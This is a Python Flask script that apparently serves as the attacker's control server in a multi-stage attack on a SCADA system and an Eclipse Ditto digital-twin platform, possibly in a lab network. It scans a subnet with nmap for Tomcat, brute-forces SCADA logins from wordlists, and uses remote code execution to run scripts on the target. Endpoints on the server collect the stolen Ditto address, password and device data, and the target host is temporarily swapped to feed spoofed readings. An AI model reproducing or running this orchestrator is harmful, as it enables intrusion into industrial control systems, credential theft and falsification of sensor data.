from flask import Flask, request, jsonify
import nmap
import time
import threading
from RCE import RCE
from utils import *

this_ip = get_ip_address('eth0')
substitute_in_file('scripts/fetch_ip_ditto.sh', {'this_ip': this_ip})
substitute_in_file('scripts/substitute_host.sh', {'this_ip': this_ip})

ip_ditto = None
last_data_ditto = {}

credientials_scada_admin, credientials_scada_user = [], []
password_ditto = None

scanner = nmap.PortScanner()
scada_url = ''
time.sleep(15)
scanner.scan('172.16.10.0-255')
for host in scanner.all_hosts():
    if 'tcp' not in scanner[host]: continue
    for port in scanner[host]['tcp'].keys():
        if scanner[host]['tcp'][port]['product'] == 'Apache Tomcat':
            scada_url = f'http://{host}:{port}'
            break
print(f"Found Scada URL: ", scada_url)

app = Flask(__name__)

@app.route('/get_script/<string:name>')
def get_script(name):
    if not name: return "error"

    with open('scripts/'+name, 'r') as f:
        return f.read()

@app.route('/ip_ditto', methods=["POST"])
def route_ip_ditto():
    ip_ditto = str(request.get_data().decode())
    print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
    
    substitute_in_file('scripts/fetch_data_ditto.sh', 
        {'ip_ditto': ip_ditto, 
        'this_ip': this_ip})
    substitute_in_file('scripts/check_credential_ditto.sh', 
    {'ip_ditto': ip_ditto,
    'this_ip': this_ip})

    return "Stored"

@app.route('/credential_ditto/<string:password>', methods=["POST"])
def route_credential_ditto(password):
    global password_ditto
    if str(request.get_data().decode()) == '{':
        password_ditto = password
        print("Found password: ", password_ditto, flush=True)

    return "Stored"

@app.route('/data_ditto', methods=["POST"])
def route_data_ditto():
    json = request.get_json()
    for thing in json['items']:
        last_data_ditto[thing['thingId']] = thing['features']

    print(last_data_ditto, flush=True)
    return "Stored"

@app.route('/api/2/things/<string:thing_id>/features')
def route_simulation(thing_id):
    return last_data_ditto[thing_id]

if __name__ == "__main__":
    ### WEBSERVER
    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', 80))
    webserverThread.start()


    ### ATTACK
    credentials_scada_admin, credientials_scada_user = bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt')   
    while len(credientials_scada_user) == 0:
        time.sleep(10)
    rce = RCE(scada_url, credientials_scada_user[0][0], credientials_scada_user[0][1], this_ip)
    rce.execute_script('fetch_ip_ditto.sh')
    bruteforce_password_ditto(scada_url, rce, 'wordlist/passwords.txt')
    print("End bruteforce ditto", flush=True)
    while password_ditto is None:
        time.sleep(10)
    print("Substituting", flush=True)
    substitute_in_file('scripts/fetch_data_ditto.sh', {'password_ditto': password_ditto})
    rce.execute_script('fetch_data_ditto.sh')
    rce.execute_script('substitute_host.sh')
    time.sleep(120)
    rce.execute_script('revert_host.sh')     

    # Possible Hash per password Scada DB
    # Base64(unhex(SHA-1($plaintext)))
